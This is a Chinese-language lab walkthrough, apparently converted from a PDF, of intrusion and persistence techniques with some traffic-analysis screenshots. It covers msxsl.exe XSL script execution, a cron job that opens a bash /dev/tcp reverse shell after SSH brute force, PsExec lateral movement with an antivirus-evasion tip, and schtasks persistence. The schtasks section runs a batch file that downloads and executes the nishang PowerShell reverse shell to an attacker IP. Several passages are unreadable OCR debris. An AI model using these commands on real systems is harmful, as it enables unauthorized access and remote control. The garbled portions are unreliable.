远程下载并执行 msxsl.exe 
![](media/image89.jpeg){width="5.883251312335958in" height="2.75in"}
## XSL Script Processing（XSL 脚本处理）
环境： Kali: 10.100.19.19 Win7 : 10.100.0.25
攻击手法： 1、在kali 制作两个文件，开启Python3 -m http.server 80
customers.xml
> \
>
> \
>
> \
>
> \
>
> \Microsoft\
>
> \
>
> \
script.xsl
> \
>
> \ xmlns:xsl=\"\"
> xmlns:msxsl=\"urn:schemas-microsoft-com:xslt\"
> xmlns:user=\"\"\>
>
> \
> function xml(nodelist) {
>
> var r = new ActiveXObject(\"WScript.Shell\").Run(\"cmd.exe /k
> calc.exe\"); return nodelist.nextNode().xml;
>
> }
>
> \
>
> \
>
> \
>
> \
>
> \
远程下载并执行 msxsl.exe 
![](media/image90.jpeg){width="5.879657699037621in" height="2.75in"}
## 本地任务调度
环境： 攻击机A：Kali（10.100.18.20）用于接收反向shell 连接 被攻击机：
CentOS （10.100.19.17）
攻击手法： 通过ssh 口令爆破或弱口令登录后写入反弹shell 的计划任务 \*/1
\* \*
\* \* bash -i \>&/dev/tcp/10.100.18.21/3333 0\>&1
![](media/image91.jpeg){width="5.8791447944007in"
height="0.6416666666666667in"}
查看例子
![](media/image92.jpeg){width="5.886437007874016in"
height="2.4016655730533683in"}
crontab -e 进行编辑
![](media/image93.jpeg){width="5.889422572178478in"
height="0.48124890638670165in"}
黑客通过在vps 上nc -lvp 3333 获取持久性shell
![](media/image94.jpeg){width="5.881943350831146in"
height="1.5629155730533684in"}
流量分析：
![](media/image95.jpeg){width="5.74966426071741in"
height="3.0592705599300087in"}
![](media/image96.jpeg){width="5.8797550306211726in"
height="3.694166666666667in"}
## PsExec
攻击机：Windows 2012 R2 （10.100.18.22）安装Python2.7（或者将py
文件打包成exe 格式可以免杀） 被攻击机：Windows 2012 R2 （10.100.18.21）
攻击手法： python psexec.py
[administrator:PI:EMAIL](mailto:PI:EMAIL)
![](media/image97.jpeg){width="5.880526027996501in"
height="6.3341666666666665in"}
流量分析：
> "\',．天廿曰
>
> "心 :, 0 立，
>
> " \'？，女 T可
>
> ＂念 2 ．四 IS2
>
> 可 ![](media/image98.jpeg){width="0.5063429571303587in"
> height="0.39743110236220475in"}
>
> ＇ ，．l, 硒 l 曷＇
>
> 立，．＂上叩
>
> ＂］？心中
>
> 1\'1.11心．立!．L
>
> 卫．出沁u＇．·::
>
> ｀｀｀ ，戊？． 1均．心．让2．2 l. .3拳．戊．\':l 1q.\`\` －丘．．：
>
> ,It "" 皇 Is 刀
>
> 坟．沁一．-:i,.l l
>
> \" . l &’. 111．宁：
>
> 垃 ． 叩 l
>
> , Q
>
> lO．＂飞l．UI.: ：山-血．戊．::
>
> ,凶11!1.\>．戊．：？凶．从．凶．i ？ 10.1,,\`.Ll.r.
>
> 凶．J＂．II!.: 1斗 1心，戊．＂凶．从 : iJ.\'n
>
> "u ．”皿 ．出l. ：:
>
> 凶, I 纨＼凶．九
>
> • · •• Ji.T.. " ; 1"" 守 1 矗 中 1 ·-1 心
>
> ![](media/image99.jpeg)U， 一 ·斤七"心＾＂
>
> i\'r\
> 心 血令冗匕．．m\~ 心上鼻\" p mt ,\_
>
> "｀ 品｀•\"\'tlJ • I 吁\~ \`" \"｀..｀心
>
> 儿2 叩位臼\' \`" \'，m 口 闷 2 收
>
> " \'l 沁｀如 归 .., l- • • •• l门、"""
>
> ""\"\'\'..,.; I 义 I 沁 止 I,. 立 ，
>
> "m、9 " \`\..... \'f\' •- • , WTI武｀＇、儿寸
>
> " \`巳 工广V，lN 印 ，
>
> """J""J"\'
>
> 又？（仅产，1，"\`,＇" \'，
>
> 4 杠,,立l
>
> ｀
>
> a, 0.，已\...,,
>
> , .,，,· 矗
>
> ，.·\$ \--·\...l;\....
>
> I I"-"""\`",.,m m..l,..（111?"" )，"\'，\" 白 ，与夕参 (1113 b1,"m m斤
> I-, 亨 h,
>
> , 1 下 崎 \" .. , 1, 环 ； V｀-·，上：六；，3 （ 帕六0·"\' ；釭；亢；E
> .1，0, T; 血心"- ｀｀"; ,L＇f (喊 佑 ｀｀中心 心 ）
>
> , ！" 斤衣"""，\'认心 ．．只｀｀妙，认囚． 让，九 0,U l令．通 ｀ . :i
>
> , 1,m叩 ·1\~ 仁下心贮心礼 丘，，寸：＂, . 伈 ·\~？:. " "·伍： 伍 ．如
> ：约 ．b 匾上"
>
> I S心（女-平修 酝量" \" \....,.., ,..，.l 谦\...1\... 2)
>
> ![](media/image100.jpeg)""""卜，""..""潭吵\"° "" \' \" 了 1
>
> ., Jr ．更 ， ＇．
>
> .. \'"\` 飞
>
> 圈 ｀
>
> E··
![](media/image101.jpeg){width="4.482928696412948in"
height="4.629166666666666in"}
## 计划任务
环境： 攻击机A：Kali（10.100.18.20）用于接收反向shell 连接 攻击机B：
Windows 2012 R2 （10.100.18.22） 被攻击机：Windows 2012 R2
（10.100.18.21）安装Python2.7（或者将py 文件打包成exe 格式可以免杀）
攻击手法： Schtasks-计划任务
> 连接 10.100.18.21 的IPC\$共享，用unc 路径 net use
> \\\\10.100.18.21\\c\$ \"3edc7JUM\" /user:Administrator
![](media/image102.jpeg){width="5.871278433945757in"
height="2.323748906386702in"}
> 查看共享 Net view \\\\10.100.18.21 目录浏览 dir
>
> \\\\10.100.18.21\\c\$\\Users\\Administrator\\Desktop\\
![](media/image103.jpeg){width="5.882836832895888in"
height="3.0204166666666667in"}
> 复制本地 1.bat 到桌面 copy 1.bat
> \\\\10.100.18.21\\c\$\\Users\\Administrator\\Desktop\\
![](media/image104.jpeg){width="5.757120516185477in"
height="0.5822911198600175in"}
> 查询目标时间 net time \\\\10.100.18.21
添加计划任务
> schtasks /create /s 10.100.18.21 /u administrator /p 3edc7UJM /ru
> \"SYSTEM\" /tn CMDNAME /sc DAILY /st 11:25 /tr
> C:\\\\Users\\\\Administrator\\\\Desktop\\\\1.bat /F
1.bat
> PowerShell IEX (New-Object
> Net.WebClient).DownloadString(\'https://raw.githubuse
> rcontent.com/samratashok/nishang/master/Shells/Invoke-PowerShellTcp.ps1\');Invo
> ke-PowerShellTcp -Reverse -IPAddress 10.100.18.20 -Port 3333
![](media/image105.jpeg){width="5.895982064741907in"
height="0.705832239720035in"}
成功获取反向shell（测试过程种会有几分钟延迟）
![](media/image106.jpeg){width="5.880879265091863in" height="6.75125in"}
流量分析：
![](media/image107.jpeg)
> 94\.... .. .flq..L.s \...\..., \"r..
>
> 8\. . .. . . .. . . . . . . . . . . . . .. . . . .
#### s哼\...\...\...\... \....
> 8.\' . . . . . . .. . .. . . .. .\'t\'. ．．．．｛．( .．..．\...{
> \
> ．
> ．．．．．．．．．．．．．．．．．．．．．．．．．．．．．．．几心．．．．．．．．．．．P．..
> . .. .. . .. .
>
> .i . , . fl q l.li , . . , , •,r . . . . ．.,．,\....\'\...\....
>
> .e)\'\...\.....,\...\...\... ,\...\...\"
> 畴\...\...\.....p..\'\...\...\.....\'\.....\'\...\'\...
>
> 8\. .. . . .. . .. . .. . . .. . ). . .X. . .. . .. . .. . . .. . .. .
> . .. . .. . . .. . .. . .. . .GE ..
>
> （，8．.．.．..．..哼\...,\...\...\...\...\.....!)\...\....P\.....
> \...\... \...\...\...\...\...\...\...\...\.....
> \...\...\...\...\...\...\...\...\...
>
> . . .. .· . .. .. . .. . . .. .. . . . .. .. . .. 8. \... . .. .. . .
> . .. .. . . .H. .. . .H. .1\'1. h. .
>
> %. q. . . . . ,\' .\' \' , .\' .s 畸
>
> 8\. .. . . . . . .. . . .. . .. .
>
> ,. . .. \' \... .\'..\' \...\...\...\'\'..\'\.....\'\...，雪
>
> . H , . .. . .. . .. . . . . . . . N. T , F . S, .. .. .. . h\...,. 气
> ·············\...,\...\...\...\...\..... ..
>
> 8 . . . . . . . . , . . . . . . . . . I\...\....·\...\...• . .• . . .
> . . . . . . . . . . . . . . . . •. • B. S
>
> .. \...\....、．．，．．．．．．,.． \', .．，．．3. . .. . . .. .. .
> .. .. . ,. .. ,. 1., S ｀增，．．，．．，
>
> 8.\'\...\...\...\'..\'\...1. p, . .. \' .. ．蠕.,..,,..
> \...\...,,..,,. \...,\..., \.....,.P 伽ol!r S,吧11